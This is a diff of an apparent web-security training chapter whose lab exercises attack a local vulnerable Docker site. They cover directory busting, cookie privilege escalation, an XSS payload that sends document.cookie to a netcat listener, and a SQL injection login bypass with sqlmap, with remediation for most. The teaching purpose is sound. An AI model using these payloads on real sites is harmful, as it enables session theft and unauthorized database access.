+>**Session** - A server-side storage of user data identified by a unique token, used to maintain state across the stateless HTTP protocol.
+>
+>**Sink** - A point in an application, such as output rendering or execution context, where untrusted data is processed in a way that can introduce a vulnerability.
+>
+>**Source** - The origin point where untrusted data enters an application, including user inputs, external APIs, or request headers.
+>
+>**SQL Injection (SQLi)** - An attack that exploits improper handling of untrusted input to manipulate or extend SQL queries, enabling unauthorized database access or commands.
+>
+>**Web Proxy Tools** - Client-side applications configured as HTTP/S proxies to intercept, inspect, modify, and replay web traffic between the browser and server.
+
+  <br>
+
+
 ## Exercises
 
 >[!exercise] Exercise 9.1 - Directory Busting
@@ -368,11 +411,10 @@ These captured requests can be modified and replayed through the Repeater and In
 >docker run -it -d -p "80:80" -v ${PWD}/app:/app --name vulnerable-site mattrayner/lamp:0.8.0-1804-php7
 >
 >```
->The container will run in the background but may need a few minutes to fully boot. After waiting a few minutes for the containers to load, run the db.sh script on the container to populate the application's database. If you receive an " `ERROR 2002 (HY000) `" it means you need to wait another minute for the container to fully boot.
+>The container will run in the background but may need a few minutes to fully boot. After waiting a few minutes for the containers to load, run the db.sh script on the container to populate the application's database. If you receive an " `ERROR 2002 (HY000) `" it means you need to wait another minute for the container to fully boot.  Open your Kali VM Firefox browser to [http://127.0.0.1](http://127.0.0.1/) and observe that the vulnerable-site application is running!
 >```bash
 >docker exec vulnerable-site /bin/bash /app/db.sh
 >```
->Open your Kali VM Firefox browser to [http://127.0.0.1](http://127.0.0.1/) and observe that the vulnerable-site application is running!
 >#### Step 3 - Install Gobuster
 >Install the `gobuster` package on your Kali VM.
 >```bash
@@ -383,27 +425,23 @@ These captured requests can be modified and replayed through the Repeater and In
 >```bash
 >gobuster dir -u [http://127.0.0.1/](http://127.0.0.1/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -x php,sh
 >```
->After a few seconds, `gobuster` discovers the `db.sh` file! Open the Firefox browser in your Kali VM and navigate to the file [http://127.0.0.1/db.sh](http://127.0.0.1/db.sh). The file downloads from the container.  Open the file by clicking the download shortcut and observe that the file contents include username and passwords in the INSERT commands!
->
->From your Kali VM Firefox browser, navigate to the vulnerable-site's login page [http://127.0.0.1/](http://127.0.0.1/). Enter the administrator username and password found in the `db.sh` file.  Observe that the credentials were valid as the browser directs us to the Welcome Page, pwned!!
+>After a few seconds, `gobuster` discovers the `db.sh` file! Open the Firefox browser in your Kali VM and navigate to the file [http://127.0.0.1/db.sh](http://127.0.0.1/db.sh). The file downloads from the container.  Open the file by clicking the download shortcut and observe that the file contents include username and passwords in the INSERT commands!  From your Kali VM Firefox browser, navigate to the vulnerable-site's login page [http://127.0.0.1/](http://127.0.0.1/). Enter the administrator username and password found in the `db.sh` file.  Observe that the credentials were valid as the browser directs us to the Welcome Page, pwned!!
 >
 
 
 >[!exercise] Exercise 9.2 - Cookie Privesc
 >Web applications could insecurely rely on cookie values to handle authorization decisions. You will identify and exploit a vulnerable application's cookie to escalate privileges in this task from your Kali VM.
->#### Step 1 - Install Docker
->This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
->#### Step 2 - Install Vulnerable-Site
->This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
->#### Step 3 - Enumerate Cookies
+>#### Step 0 - Install Docker and Vulnerable-Site (if needed)
+>This step should not be needed if Exercise 9.1 and 9.2 were already completed; otherwise, refer to Exercise 9.1 - Step 1 and 9.1 - Step 2 for instructions.
+>#### Step 1 - Enumerate Cookies
 >With the vulnerable-site running in your Kali VM, open Firefox and navigate to [http://127.0.0.1/](http://127.0.0.1/). Login as the low privileged user (username=daniel and password=Password123).
 >
 >Open the developer console (F12), select the Storage tab, Cookies (left navigation tree), and select the [http://127.0.0.1](http://127.0.0.1/) site. Observe that there is a cookie called "role" with a value of "user".
->#### Step 4 - Escalate Privileges
+>#### Step 2 - Escalate Privileges
 >With the "role" cookie identified in the developer console, double click the cookie value ("user") and replace the value with the word "administrator" then press enter.
 >
 >Reload the page with the new cookie value and navigate to the Administrator Page to confirm full access.
->#### Step 5 - Remediate Vulnerable Cookie
+>#### Step 3 - Remediate Vulnerable Cookie
 >Trusting cookie values, especially for authorization purposes, can lead to privilege escalations. A better approach would be to place authorization variables server side in sessions. Launch a bash terminal in the Kali VM and open the `index.php` file using nano. Observe that the cookie is set in line 14's `setcookie` function call.
 >```bash
 >nano ~/vulnerable-site/app/index.php
@@ -429,11 +467,9 @@ These captured requests can be modified and replayed through the Repeater and In
 
 >[!exercise] Exercise 9.3 - Cross Site Scripting (XSS)
 >You will discover and exploit an XSS vulnerability in the vulnerable-site to steal the administrator's session cookie from within your Kali VM.
->#### Step 1 - Install Docker
->This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
->#### Step 2 - Install Vulnerable-Site
->This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
->#### Step 3 - Identify XSS
+>#### Step 0 - Install Docker and Vulnerable-Site (if needed)
+>This step should not be needed if Exercise 9.1 and 9.2 were already completed; otherwise, refer to Exercise 9.1 - Step 1 and 9.1 - Step 2 for instructions.
+>#### Step 1 - Identify XSS
 >With the vulnerable-site running in your Kali VM, launch a Firefox instance and navigate to [http://127.0.0.1/](http://127.0.0.1/). 
 >
 >Open the source code of the login page by right clicking anywhere on the page and selecting "View Page Source" from the context menu.
@@ -453,7 +489,7 @@ These captured requests can be modified and replayed through the Repeater and In
 >```
 >
 >Observe that a JavaScript alert box executed! Press Ok in the alert box to finish loading the page.
->#### Step 4 - Stage the Attack
+>#### Step 2 - Stage the Attack
 >You will craft a malicious payload that sends the admin user's cookie value to an attacker-controlled server. The following payload creates an image object sourced from a remote server. The remote server is your attacker-controlled URL that has the victim user's cookie appended to it.
 >```
 ><script>var i=new Image;i.src="http://127.0.0.1:9001/?"+document.cookie;</script>
@@ -471,7 +507,7 @@ These captured requests can be modified and replayed through the Repeater and In
 >```bash
 >nc -lp 9001
 >```
->#### Step 5 - Trigger the Attack
+>#### Step 3 - Trigger the Attack
 >Open a new non-private Firefox browser and navigate to [http://127.0.0.1/](http://127.0.0.1/). This browser session will be used to simulate the victim's activity.
 >
 >Log in as the admin user (username=admin and password=SuperSecret1!).
@@ -482,7 +518,7 @@ These captured requests can be modified and replayed through the Repeater and In
 >```
 >
 >Navigate to the attacker terminal with the `netcat` listener set up in the previous step. Observe that the received connection includes the cookie value from the victim!  The `PHPSESSID` cookie value is the session identifier used by the web application to identify logged in users. With this token, the attacker can access authenticated pages as the victim!
->#### Step 6 - Mitigate the Vulnerability
+>#### Step 4 - Mitigate the Vulnerability
 >In a Kali VM bash terminal, open the `footer.php` file in the vulnerable-site/app directory using `nano` text editor.
 >```bash
 >nano ~/vulnerable-site/app/home.php
@@ -499,18 +535,16 @@ These captured requests can be modified and replayed through the Repeater and In
 
 >[!exercise] Exercise 9.4 - SQL Injection (SQLi)
 >Bypass authentication controls by exploiting a SQL injection vulnerability. Then dump the Users table from the database using `SQLmap`.
->#### Step 1 - Install Docker
->This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
->#### Step 2 - Install Vulnerable-Site
->This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
->#### Step 3 - Identify SQLi
+>#### Step 0 - Install Docker and Vulnerable-Site (if needed)
+>This step should not be needed if Exercise 9.1 and 9.2 were already completed; otherwise, refer to Exercise 9.1 - Step 1 and 9.1 - Step 2 for instructions.
+>#### Step 1 - Identify SQLi
 >With the vulnerable-site running in your Kali VM, navigate to [http://127.0.0.1/](http://127.0.0.1/) and enter an incorrect username and password combination. Observe that the error message "Wrong username/password" is displayed.
->#### Step 4 - Manual SQLi Exploitation
+>#### Step 2 - Manual SQLi Exploitation
 >Return to the vulnerable-site login page. Enter the following payload as the username and password and press the submit button. Observe that the application logs us in as the administrator!
 >
 >`lol' OR 1=1-- -`
 >Explain why this payload logged you into the application.
->#### Step 5 - Automated SQLi with SQLMap
+>#### Step 3 - Automated SQLi with SQLMap
 >Return to the vulnerable-site's login page and enter any incorrect username and password. Observe the "Wrong username/password" message. Copy the URL to your clipboard to use in the `sqlmap` tool.
 >
 >`http://127.0.0.1/?username=lol&password=lol&version=beta 
